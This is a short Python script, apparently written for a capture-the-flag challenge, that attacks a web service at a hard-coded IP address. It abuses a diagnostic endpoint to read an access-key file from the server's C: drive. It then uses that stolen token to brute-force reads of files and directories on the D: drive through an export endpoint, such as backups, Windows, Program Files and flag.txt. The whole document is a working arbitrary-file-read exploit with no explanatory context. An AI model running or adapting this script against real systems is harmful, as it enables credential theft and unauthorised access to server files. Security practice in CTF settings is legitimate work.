import requests

BASE_URL = "http://1.95.51.2:8080"
TOKEN_PATH = r"\\?\C:\token\access_key.txt"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": TOKEN_PATH}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def check(path):
    t = get_token()
    if not t: return
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": path, "token": t}, timeout=5)
        if r.status_code != 403 and r.status_code != 401:
            print(f"FOUND: {path} -> {r.status_code} {r.text[:100]}")
        else:
            # print(f"Checking {path} -> {r.status_code}")
            pass
    except:
        pass

if __name__ == "__main__":
    files = [
        "flag.txt", "backup.txt", "token.txt", "access_key.txt",
        "Users", "Windows", "Program Files", "ProgramData",
        "inetpub", "xampp", "backup", "backups", "share",
        "data", "export", "172.20.0.10"
    ]
    
    dirs = ["", "backup\\", "backups\\", "share\\", "data\\", "export\\"]
    
    for d in dirs:
        for f in files:
            path = fr"\\?\D:\{d}{f}"
            check(path)
